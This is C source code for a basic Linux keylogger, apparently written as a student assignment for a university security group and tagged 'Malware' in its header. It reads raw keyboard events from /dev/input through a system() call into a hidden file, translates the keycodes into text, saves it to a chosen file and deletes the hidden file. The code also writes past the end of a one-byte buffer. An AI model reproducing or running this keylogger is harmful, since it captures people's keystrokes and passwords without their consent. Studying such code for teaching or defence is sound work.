/*
 * Universidade Federal do Rio de Janeiro
 * PS-GRIS
 * Autor: Pedro Jullian Medina Torres Graca
 * TAG:	Malware
 * Aplicador: José
 * Descricao: Keylogger básico para linux
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "keylogger.h"

int
main (int argc , char *argv[])
{
//	unsigned indice,auxiliar;
	char saida[1];
	FILE *arqTraducao , *code;
	size_t lidos;
	byte buffer [COMPRIMENTO_BUFFER];
	tipoErros verificador;

//	char linha[TAMANHO_MAXIMO_LINHA];
	
	printf ("\nNAO ESQUEÇA QUE ESSE PROGRAMA PRECISA DE SUDO PRA FUNCIONAR\n");
	if (argc!=NUMERO_ARGUMENTOS)
	{
		printf ("\nUso: %s <nome-do-arquivo-que-vc-deseja-colocar-os-dados>\n",argv[0]);
		exit (numeroArgumentosInvalido);		
	}

	system ("cat /dev/input/by-path/*-kbd > ./.hex");
	/*preciso tratar para caso nao tenha permissao*/
	/*cria arquivo hex das teclas digitadas*/

	/*precisa aprender como joga ctrl-c via C. com isso posso colocar um time como entrada e pegar tudo que foi escrito num tempo*/

	if (!(code = fopen (".hex","r")))
	{
		printf ("\nNão foi possivel abrir o arquivo \"%s\"", ".hex");
    printf ("\nErro (#%i): %s\n", naoConseguindoAbrirArquivo, "arquivo NULL");
    exit(naoConseguindoAbrirArquivo);
	}/*abre arquivo que precisa de correção*/
	
	/*seria bom tratar o argv[1] obrigando ele a ser apenas letras e pontos e sempre terminar com .txt*/
	
	if (!(arqTraducao= fopen (argv[1], "w")))
	{
		printf ("\nNão foi possivel construir o arquivo \"%s\"", argv[1]);
    printf ("\nErro (#%i): %s\n", naoConseguindoAbrirArquivo, "arquivo NULL");
    exit(naoConseguindoAbrirArquivo);
	}/*abre arquivo que recebera a correcao*/
	
	/*aqui irei ler o .hex, traduzir e passar pro arquivo argv[1]*/
	while ((lidos=fread (buffer, COMPRIMENTO_BUFFER,1,code)))
	{
		if ((verificador=tradutor (buffer,&saida[0]))==ok)
		{
			saida[1]=EOS;
			fputs(saida,arqTraducao);
		}
		else
		{
			if (verificador==naoAchado);
			else
			{
				printf ("Erro(#%i): erro ao tentar traduzir algum valor\n",verificador);
			}
		}
	}/*loop de ler .hex e colocar no nome pedido*/
	fputs("\n",arqTraducao);

	if (fclose (code)!=0)
	{
		printf ("\nNao foi possivel fechar o arquivo \"%s\"", "a.txt");
		printf ("\nErro (#%i): %s", naoConseguindofecharArquivo, "desconhecido\n");
		exit (naoConseguindofecharArquivo);
	}/* fecha*/

	system ("rm .hex"); /*apaga arquivo que foi traduzido*/

	if (fclose (arqTraducao)!=0)
	{
		printf ("\nNao foi possivel fechar o arquivo \"%s\"", argv[1]);
		printf ("\nErro (#%i): %s", naoConseguindofecharArquivo, "desconhecido\n");
		exit (naoConseguindofecharArquivo);
	}

	return ok;
}
